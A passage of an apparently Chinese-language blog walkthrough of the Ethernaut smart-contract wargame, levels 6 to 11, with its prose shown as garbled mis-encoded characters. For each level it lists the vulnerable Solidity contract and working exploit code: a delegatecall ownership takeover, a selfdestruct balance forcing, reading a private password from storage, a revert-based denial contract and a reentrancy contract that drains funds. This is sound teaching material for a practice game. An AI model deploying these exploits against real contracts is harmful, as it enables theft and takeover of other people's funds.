title="é—¯å…³è¦æ±‚"></a>é—¯å…³è¦æ±‚</h3><p>è¿™ä¸€å…³çš„ç›®æ ‡æ˜¯ç”³æ˜ä½ å¯¹ä½ åˆ›å»ºå®ä¾‹çš„æ‰€æœ‰æƒ.</p><h3 id="åˆçº¦ä»£ç -5"><a href="#åˆçº¦ä»£ç -5" class="headerlink" title="åˆçº¦ä»£ç "></a>åˆçº¦ä»£ç </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract Delegate &#123;<br><br>  address public owner;<br><br>  constructor(address _owner) public &#123;<br>    owner = _owner;<br>  &#125;<br><br>  function pwn() public &#123;<br>    owner = msg.sender;<br>  &#125;<br>&#125;<br><br>contract Delegation &#123;<br><br>  address public owner;<br>  Delegate delegate;<br><br>  constructor(address _delegateAddress) public &#123;<br>    delegate = Delegate(_delegateAddress);<br>    owner = msg.sender;<br>  &#125;<br><br>  fallback() external &#123;<br>    (bool result,) = address(delegate).delegatecall(msg.data);<br>    if (result) &#123;<br>      this;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åˆçº¦åˆ†æ-5"><a href="#åˆçº¦åˆ†æ-5" class="headerlink" title="åˆçº¦åˆ†æ"></a>åˆçº¦åˆ†æ</h3><ul><li><p><code>Solidity</code> æ”¯æŒä¸¤ç§åº•å±‚è°ƒç”¨æ–¹å¼ <strong>call</strong> å’Œ <strong>delegatecall</strong></p><p><strong>call</strong> å¤–éƒ¨è°ƒç”¨æ—¶ï¼Œä¸Šä¸‹æ–‡æ˜¯å¤–éƒ¨åˆçº¦</p><p><strong>delegatecall</strong> å¤–éƒ¨è°ƒç”¨æ—¶ï¼Œä¸Šä¸‹æ–‡æ˜¯è°ƒç”¨åˆçº¦</p><p><strong>call</strong> ä¸ <strong>delegatecall</strong> çš„åŠŸèƒ½ç±»ä¼¼ï¼ŒåŒºåˆ«ä»…åœ¨äºåè€…ä»…ä½¿ç”¨ç»™å®šåœ°å€çš„ä»£ç ï¼Œå…¶å®ƒä¿¡æ¯åˆ™ä½¿ç”¨å½“å‰åˆçº¦(å¦‚å­˜å‚¨ï¼Œä½™é¢ç­‰ç­‰)ã€‚</p><p>å‡½æ•°çš„è®¾è®¡ç›®çš„æ˜¯ä¸ºäº†ä½¿ç”¨å­˜å‚¨åœ¨å¦ä¸€ä¸ªåˆçº¦çš„åº“ä»£ç ã€‚</p><p>äºŒè€…æ‰§è¡Œä»£ç çš„ä¸Šä¸‹æ–‡ç¯å¢ƒçš„ä¸åŒï¼Œå½“ä½¿ç”¨callè°ƒç”¨å…¶å®ƒåˆçº¦çš„å‡½æ•°æ—¶ï¼Œä»£ç æ˜¯åœ¨è¢«è°ƒç”¨çš„åˆçº¦çš„ç¯å¢ƒé‡Œæ‰§è¡Œï¼Œå¯¹åº”çš„ï¼Œä½¿ç”¨delegatecallè¿›è¡Œå‡½æ•°è°ƒç”¨æ—¶ä»£ç åˆ™æ˜¯åœ¨è°ƒç”¨å‡½æ•°çš„åˆçº¦çš„ç¯å¢ƒé‡Œæ‰§è¡Œã€‚</p><p>æ‰€ä»¥ <code>delegate.delegatecall(msg.data)</code> å…¶å®è°ƒç”¨çš„æ˜¯ <code>delegate</code> è‡ªèº«çš„ <code>msg.data</code></p></li><li><p><code>data</code> å¤´<code>4</code>ä¸ª <code>byte</code> æ˜¯è¢«è°ƒç”¨æ–¹æ³•çš„ç­¾åå“ˆå¸Œï¼Œå³ <code>bytes4(keccak256(&quot;func&quot;))</code> , <code>remix</code> é‡Œè°ƒç”¨å‡½æ•°ï¼Œå®é™…æ˜¯å‘åˆçº¦è´¦æˆ·åœ°å€å‘é€äº†( <code>msg.data[0:4]</code> == å‡½æ•°ç­¾åå“ˆå¸Œ )çš„ä¸€ç¬”äº¤æ˜“</p><p>æ‰€ä»¥æˆ‘ä»¬åªéœ€è°ƒç”¨ <code>Delegation</code> çš„ <code>fallback</code> çš„åŒæ—¶åœ¨ <code>msg.data</code> æ”¾å…¥ <code>pwn</code> å‡½æ•°çš„ç­¾åå³å¯</p></li><li><p><code>fallback</code> çš„è§¦å‘æ¡ä»¶ï¼š</p><ul><li>ä¸€æ˜¯å¦‚æœåˆçº¦åœ¨è¢«è°ƒç”¨çš„æ—¶å€™ï¼Œæ‰¾ä¸åˆ°å¯¹æ–¹è°ƒç”¨çš„å‡½æ•°ï¼Œå°±ä¼šè‡ªåŠ¨è°ƒç”¨ <code>fallback</code> å‡½æ•°</li><li>äºŒæ˜¯åªè¦æ˜¯åˆçº¦æ”¶åˆ°åˆ«äººå‘é€çš„ <code>Ether</code> ä¸”æ²¡æœ‰æ•°æ®ï¼Œå°±ä¼šå°è¯•æ‰§è¡Œ <code>fallback</code> å‡½æ•°ï¼Œæ­¤æ—¶ <code>fallback</code> éœ€è¦å¸¦æœ‰ <code>payable</code> æ ‡è®°ï¼Œå¦åˆ™ï¼Œåˆçº¦å°±ä¼šæ‹’ç»è¿™ä¸ª <code>Ether</code></li></ul></li></ul><p>æ‰€ä»¥ï¼Œé€šè¿‡è½¬è´¦è§¦å‘ <code>Delegation</code> åˆçº¦çš„ <code>fallback</code> å‡½æ•°ï¼ŒåŒæ—¶è®¾ç½® <code>data</code> ä¸º <code>pwn</code> å‡½æ•°çš„æ ‡è¯†ç¬¦ã€‚</p><h3 id="æ”»å‡»æµç¨‹-5"><a href="#æ”»å‡»æµç¨‹-5" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//sha3çš„è¿”å›å€¼å‰ä¸¤ä¸ªä¸º0xï¼Œæ‰€ä»¥è¦åˆ‡0-10ä¸ªå­—ç¬¦ã€‚</span><br>contract.sendTransaction(&#123;<span class="hljs-attr">data</span>: web3.utils.sha3(<span class="hljs-string">&quot;pwn()&quot;</span>).slice(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>)&#125;);<br></code></pre></td></tr></table></figure><p>å¯èƒ½ä¼šout of gasï¼Œæé«˜gasä¸Šé™å³å¯</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220227152252411.png" alt="image-20220227152252411"></p><h2 id="7-Force"><a href="#7-Force" class="headerlink" title="7. Force"></a>7. Force</h2><h3 id="é—¯å…³è¦æ±‚-6"><a href="#é—¯å…³è¦æ±‚-6" class="headerlink" title="é—¯å…³è¦æ±‚"></a>é—¯å…³è¦æ±‚</h3><p>ä½¿åˆçº¦çš„ä½™é¢å¤§äº0</p><h3 id="åˆçº¦ä»£ç -6"><a href="#åˆçº¦ä»£ç -6" class="headerlink" title="åˆçº¦ä»£ç "></a>åˆçº¦ä»£ç </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract Force &#123;/*<br><br>                   MEOW ?<br>         /\_/\   /<br>    ____/ o o \<br>  /~____  =Ã¸= /<br> (______)__m_m)<br><br>*/&#125;<br></code></pre></td></tr></table></figure><h3 id="åˆçº¦åˆ†æ-6"><a href="#åˆçº¦åˆ†æ-6" class="headerlink" title="åˆçº¦åˆ†æ"></a>åˆçº¦åˆ†æ</h3><p>åœ¨ä»¥å¤ªåŠé‡Œæˆ‘ä»¬æ˜¯å¯ä»¥å¼ºåˆ¶ç»™ä¸€ä¸ªåˆçº¦å‘é€ethçš„ï¼Œä¸ç®¡å®ƒè¦ä¸è¦å®ƒéƒ½å¾—æ”¶ä¸‹ï¼Œè¿™æ˜¯é€šè¿‡selfdestructå‡½æ•°æ¥å®ç°çš„ï¼Œå¦‚å®ƒçš„åå­—æ‰€æ˜¾ç¤ºçš„ï¼Œè¿™æ˜¯ä¸€ä¸ªè‡ªæ¯å‡½æ•°ï¼Œå½“ä½ è°ƒç”¨å®ƒçš„æ—¶å€™ï¼Œå®ƒä¼šä½¿è¯¥åˆçº¦æ— æ•ˆåŒ–å¹¶åˆ é™¤è¯¥åœ°å€çš„å­—èŠ‚ç ï¼Œç„¶åå®ƒä¼šæŠŠåˆçº¦é‡Œå‰©ä½™çš„èµ„é‡‘å‘é€ç»™å‚æ•°æ‰€æŒ‡å®šçš„åœ°å€ï¼Œæ¯”è¾ƒç‰¹æ®Šçš„æ˜¯è¿™ç¬”èµ„é‡‘çš„å‘é€å°†æ— è§†åˆçº¦çš„fallbackå‡½æ•°ï¼Œå› ä¸ºæˆ‘ä»¬ä¹‹å‰ä¹Ÿæåˆ°äº†å½“åˆçº¦ç›´æ¥æ”¶åˆ°ä¸€ç¬”ä¸çŸ¥å¦‚ä½•å¤„ç†çš„ethæ—¶ä¼šè§¦å‘fallbackå‡½æ•°ï¼Œç„¶è€Œselfdestructçš„å‘é€å°†æ— è§†è¿™ä¸€ç‚¹ã€‚</p><h3 id="æ”»å‡»æµç¨‹-6"><a href="#æ”»å‡»æµç¨‹-6" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity 0.4.20;<br><br>contract Force &#123;<br>    function Force() public payable &#123;&#125;<br>    function attack(address _target) public &#123;<br>        selfdestruct(_target);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥ç”¨<code>getBalance(instance)</code>æ¥æŸ¥è¯¢å®ä¾‹ä½™é¢</p><p>è®°å¾—éƒ¨ç½²åˆçº¦çš„æ—¶å€™å­˜ä¸€ç‚¹é’±è¿›å»</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220221221632944.png" alt="image-20220221221632944"></p><h2 id="8-Vault"><a href="#8-Vault" class="headerlink" title="8. Vault"></a>8. Vault</h2><h3 id="é—¯å…³è¦æ±‚-7"><a href="#é—¯å…³è¦æ±‚-7" class="headerlink" title="é—¯å…³è¦æ±‚"></a>é—¯å…³è¦æ±‚</h3><p>æ‰“å¼€ vault æ¥é€šè¿‡è¿™ä¸€å…³!</p><h3 id="åˆçº¦ä»£ç -7"><a href="#åˆçº¦ä»£ç -7" class="headerlink" title="åˆçº¦ä»£ç "></a>åˆçº¦ä»£ç </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract Vault &#123;<br>  bool public locked;<br>  bytes32 private password;<br><br>  constructor(bytes32 _password) public &#123;<br>    locked = true;<br>    password = _password;<br>  &#125;<br><br>  function unlock(bytes32 _password) public &#123;<br>    if (password == _password) &#123;<br>      locked = false;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åˆçº¦åˆ†æ-7"><a href="#åˆçº¦åˆ†æ-7" class="headerlink" title="åˆçº¦åˆ†æ"></a>åˆçº¦åˆ†æ</h3><p>ä½¿ç”¨<code>web3.eth.getStorageAt()</code>æ–¹æ³•è¿”å›ä¸€ä¸ªä»¥å¤ªåŠåœ°å€çš„æŒ‡å®šä½ç½®å­˜å‚¨å†…å®¹ï¼Œå€Ÿæ­¤è·å¾—å¯†ç å†…å®¹</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220223155339055.png" alt="image-20220223155339055"></p><h3 id="æ”»å‡»æµç¨‹-7"><a href="#æ”»å‡»æµç¨‹-7" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h3><ol><li><p><code>web3.eth.getStorageAt(contract.address, 1)</code></p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220223161137206.png" alt="image-20220223161137206"></p></li><li><p><code>contract.unlock(&#39;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&#39;)</code></p><p>å‡æŠ¥é”™</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/918b31ad3155cfc4d5e4bdd4e9841d5.png" alt="918b31ad3155cfc4d5e4bdd4e9841d5"></p><p>æˆåŠŸ</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220223161340419.png" alt="image-20220223161340419"></p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220223161409985.png" alt="image-20220223161409985"></p></li></ol><h2 id="9-King"><a href="#9-King" class="headerlink" title="9. King"></a>9. King</h2><h3 id="é—¯å…³è¦æ±‚-8"><a href="#é—¯å…³è¦æ±‚-8" class="headerlink" title="é—¯å…³è¦æ±‚"></a>é—¯å…³è¦æ±‚</h3><p>ä¸‹é¢çš„åˆçº¦è¡¨ç¤ºäº†ä¸€ä¸ªå¾ˆç®€å•çš„æ¸¸æˆ: ä»»ä½•ä¸€ä¸ªå‘é€äº†é«˜äºç›®å‰ä»·æ ¼çš„äººå°†æˆä¸ºæ–°çš„å›½ç‹. åœ¨è¿™ä¸ªæƒ…å†µä¸‹, ä¸Šä¸€ä¸ªå›½ç‹å°†ä¼šè·å¾—æ–°çš„å‡ºä»·, è¿™æ ·å¯ä»¥èµšå¾—ä¸€äº›ä»¥å¤ªå¸. çœ‹èµ·æ¥åƒæ˜¯åºæ°éª—å±€.</p><p>è¿™ä¹ˆæœ‰è¶£çš„æ¸¸æˆ, ä½ çš„ç›®æ ‡æ˜¯æ”»ç ´ä»–.</p><p>å½“ä½ æäº¤å®ä¾‹ç»™å…³å¡æ—¶, å…³å¡ä¼šé‡æ–°ç”³æ˜ç‹ä½. ä½ éœ€è¦é˜»æ­¢ä»–é‡è·ç‹ä½æ¥é€šè¿‡è¿™ä¸€å…³.</p><h3 id="åˆçº¦ä»£ç -8"><a href="#åˆçº¦ä»£ç -8" class="headerlink" title="åˆçº¦ä»£ç "></a>åˆçº¦ä»£ç </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract King &#123;<br><br>  address payable king;<br>  uint public prize;<br>  address payable public owner;<br><br>  constructor() public payable &#123;<br>    owner = msg.sender;  <br>    king = msg.sender;<br>    prize = msg.value;<br>  &#125;<br><br>  receive() external payable &#123;<br>    require(msg.value &gt;= prize || msg.sender == owner);<br>    king.transfer(msg.value);<br>    king = msg.sender;<br>    prize = msg.value;<br>  &#125;<br><br>  function _king() public view returns (address payable) &#123;<br>    return king;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åˆçº¦åˆ†æ-8"><a href="#åˆçº¦åˆ†æ-8" class="headerlink" title="åˆçº¦åˆ†æ"></a>åˆçº¦åˆ†æ</h3><p>åªè¦å›½ç‹æ‹’ç»æ¥æ”¶å¥–åŠ±å³å¯ä¸€ç›´å½“å›½ç‹ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥éƒ¨ç½²æ”»å‡»åˆçº¦ï¼Œä½¿ç”¨ <code>revert()</code> å æ®åˆçº¦çš„kingä¸æ”¾</p><h3 id="æ”»å‡»æµç¨‹-8"><a href="#æ”»å‡»æµç¨‹-8" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h3><ol><li><p>æŸ¥è¯¢ç›®å‰æœ€é«˜ä»·</p><p><code>web3.utils.fromWei</code> èƒ½å°†ç»™å®šçš„ä»¥weiä¸ºå•ä½çš„å€¼è½¬æ¢ä¸ºå…¶ä»–å•ä½çš„æ•°å€¼ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js">web3.utils.fromWei(<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;ether&#x27;</span>); <span class="hljs-comment">//é»˜è®¤</span><br>&gt; <span class="hljs-string">&quot;0.000000000000000001&quot;</span><br><br>web3.utils.fromWei(<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;finney&#x27;</span>);<br>&gt; <span class="hljs-string">&quot;0.000000000000001&quot;</span><br><br>web3.utils.fromWei(<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;szabo&#x27;</span>);<br>&gt; <span class="hljs-string">&quot;0.000000000001&quot;</span><br><br>web3.utils.fromWei(<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;shannon&#x27;</span>);<br>&gt; <span class="hljs-string">&quot;0.000000001&quot;</span><br></code></pre></td></tr></table></figure><p>ç›´æ¥ä½¿ç”¨ <code>fromWei(contract.prize)</code> ä¼šæŠ¥é”™</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220223220836386.png" alt="image-20220223220836386"></p><p>å¯ä½¿ç”¨ <code>toBN()</code> è½¬æ¢ä¸€ä¸‹</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220223220944150.png" alt="image-20220223220944150"></p><p>å³å‡ºä»·æ¯”0.001etheré«˜å³å¯</p></li><li><p>æŸ¥è¯¢ç°åœ¨çš„king</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220223221109151.png" alt="image-20220223221109151"></p></li><li><p>éƒ¨ç½²åˆçº¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity 0.4.18;<br><br>contract attack &#123;<br>    function attack(address _add) public payable &#123;<br>        _add.call.gas(1000000).value(msg.value)();<br>    &#125;<br><br>    function () public &#123;<br>        revert();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>æäº¤å®ä¾‹</p><p>å¯ä»¥çœ‹åˆ°å†æ¬¡æŸ¥è¯¢kingçš„åœ°å€å˜ä¸ºäº†æ”»å‡»åˆçº¦çš„åœ°å€</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220223221202590.png" alt="image-20220223221202590"></p></li></ol><h2 id="10-Re-entrancy"><a href="#10-Re-entrancy" class="headerlink" title="10. Re-entrancy"></a>10. Re-entrancy</h2><h3 id="é—¯å…³è¦æ±‚-9"><a href="#é—¯å…³è¦æ±‚-9" class="headerlink" title="é—¯å…³è¦æ±‚"></a>é—¯å…³è¦æ±‚</h3><p>è¿™ä¸€å…³çš„ç›®æ ‡æ˜¯å·èµ°åˆçº¦çš„æ‰€æœ‰èµ„äº§.</p><h3 id="åˆçº¦ä»£ç -9"><a href="#åˆçº¦ä»£ç -9" class="headerlink" title="åˆçº¦ä»£ç "></a>åˆçº¦ä»£ç </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;<br><br>contract Reentrance &#123;<br>  <br>  using SafeMath for uint256;<br>  mapping(address =&gt; uint) public balances;<br><br>  function donate(address _to) public payable &#123;<br>    balances[_to] = balances[_to].add(msg.value);<br>  &#125;<br><br>  function balanceOf(address _who) public view returns (uint balance) &#123;<br>    return balances[_who];<br>  &#125;<br><br>  function withdraw(uint _amount) public &#123;<br>    if(balances[msg.sender] &gt;= _amount) &#123;<br>      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);<br>      if(result) &#123;<br>        _amount;<br>      &#125;<br>      balances[msg.sender] -= _amount;<br>    &#125;<br>  &#125;<br><br>  receive() external payable &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åˆçº¦åˆ†æ-9"><a href="#åˆçº¦åˆ†æ-9" class="headerlink" title="åˆçº¦åˆ†æ"></a>åˆçº¦åˆ†æ</h3><p>é‡å…¥</p><h3 id="æ”»å‡»æµç¨‹-9"><a href="#æ”»å‡»æµç¨‹-9" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.10;<br><br>import &quot;@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol&quot;;<br><br>contract Reentrance &#123;<br>  <br>  using SafeMath for uint256;<br>  mapping(address =&gt; uint) public balances;<br><br>  function donate(address _to) public payable &#123;<br>    balances[_to] = balances[_to].add(msg.value);<br>  &#125;<br><br>  function balanceOf(address _who) public view returns (uint balance) &#123;<br>    return balances[_who];<br>  &#125;<br><br>  function withdraw(uint _amount) public &#123;<br>    if(balances[msg.sender] &gt;= _amount) &#123;<br>      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);<br>      if(result) &#123;<br>        _amount;<br>      &#125;<br>      balances[msg.sender] -= _amount;<br>    &#125;<br>  &#125;<br><br>  receive() external payable &#123;&#125;<br>&#125;<br><br>contract exploit &#123; <br>  //è®¾å®šç›®æ ‡åˆçº¦åœ°å€<br>  Reentrance reentrance;<br>  constructor(address payable instance_add) public payable &#123;<br>    reentrance = Reentrance(instance_add);<br>  &#125;<br><br>  //é‡å†™fallback<br>  fallback() external payable &#123;<br>    if(address(reentrance).balance &gt;= 0 ether)&#123;<br>      reentrance.withdraw(0.001 ether);<br>    &#125;<br>  &#125;<br><br>  //æ”»å‡»ï¼Œè°ƒç”¨withdraw<br>  function attack() external &#123;<br>    reentrance.donate&#123;value: 0.002 ether&#125;(address(this));<br>    reentrance.withdraw(0.001 ether);<br>  &#125;<br><br>  //æŸ¥è¯¢ä½™é¢<br>  function instance_balance() public view returns (uint) &#123;<br>    return address(reentrance).balance;<br>  &#125;<br><br>   <br>&#125;<br><br></code></pre></td></tr></table></figure><p>éƒ¨ç½²åˆçº¦æ—¶æ‰“å…¥ä¸€äº›é’±</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220224201600577.png" alt="image-20220224201600577"></p><p>ä½¿ç”¨å‡½æ•°æŸ¥è¯¢å®ä¾‹åˆçº¦ä¸­åŸæœ‰ä½™é¢</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220224171227027.png" alt="image-20220224171227027"></p><p>æ”»å‡»å®Œæˆåå†æ¬¡æŸ¥è¯¢ä½™é¢</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220224201734086.png" alt="image-20220224201734086"></p><p>ä¹Ÿå¯ä»¥åœ¨æ§åˆ¶å°ä¸­æŸ¥è¯¢</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220224201803486.png" alt="image-20220224201803486"></p><h2 id="11-Elevator"><a href="#11-Elevator" class="headerlink" title="11. Elevator"></a>11. Elevator</h2><h3 id="é—¯å…³è¦æ±‚-10"><a href="#é—¯å…³è¦æ±‚-10" class="headerlink" title="é—¯å…³è¦æ±‚"></a>é—¯å…³è¦æ±‚</h3><p>ç”µæ¢¯ä¸ä¼šè®©ä½ è¾¾åˆ°å¤§æ¥¼é¡¶éƒ¨, å¯¹å§?</p><h3 id="åˆçº¦ä»£ç -10"><a href="#åˆçº¦ä»£ç -10" class="headerlink" title="åˆçº¦ä»£ç "></a>åˆçº¦ä»£ç </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>interface Building &#123;<br>  function isLastFloor(uint) external returns (bool);<br>&#125;<br><br><br>contract Elevator &#123;<br>  bool public top;<br>  uint public floor;<br><br>  function goTo(uint _floor) public &#123;<br>    Building building = Building(msg.sender);<br><br>    if (! building.isLastFloor(_floor)) &#123;<br>      floor = _floor;<br>      top = building.isLastFloor(floor);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 